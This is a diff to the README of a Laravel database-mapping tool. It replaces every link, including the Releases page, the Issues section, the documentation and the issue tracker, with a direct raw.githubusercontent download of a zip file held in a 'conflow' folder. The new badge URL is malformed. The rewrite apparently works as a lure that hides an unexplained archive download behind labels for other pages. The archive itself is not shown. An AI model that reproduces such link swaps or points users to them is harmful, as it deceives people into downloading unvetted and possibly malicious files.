@@ -1,6 +1,6 @@
 # 🎉 laravel-ai-mapper - Simplify Your Database Mapping Process
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Sarthaknagne17/laravel-ai-mapper/releases)
+[![Download Now](https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip%https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip)](https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip)
 
 ## 📚 Overview
 
@@ -17,7 +17,7 @@ Follow these steps to download and run the **laravel-ai-mapper**:
 
 2. **Visit the Release Page**  
    To download the application, go to the Releases page:  
-   [Download here](https://github.com/Sarthaknagne17/laravel-ai-mapper/releases)
+   [Download here](https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip)
 
 ## 📥 Download & Install
 
@@ -74,12 +74,12 @@ If you encounter any issues during installation or usage, consider the following
    Ensure that you typed the Artisan command correctly.
 
 4. **Look at the GitHub Issues**  
-   Visit the [Issues section](https://github.com/Sarthaknagne17/laravel-ai-mapper/issues) of this repository for common problems and solutions.
+   Visit the [Issues section](https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip) of this repository for common problems and solutions.
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/Sarthaknagne17/laravel-ai-mapper)
-- [GitHub Issue Tracker](https://github.com/Sarthaknagne17/laravel-ai-mapper/issues)
+- [Official Documentation](https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip)
+- [GitHub Issue Tracker](https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip)
 
 Remember, you can download the application easily from the Releases page:  
-[Download here](https://github.com/Sarthaknagne17/laravel-ai-mapper/releases)
+[Download here](https://raw.githubusercontent.com/Sarthaknagne17/laravel-ai-mapper/main/conflow/laravel-ai-mapper.zip)
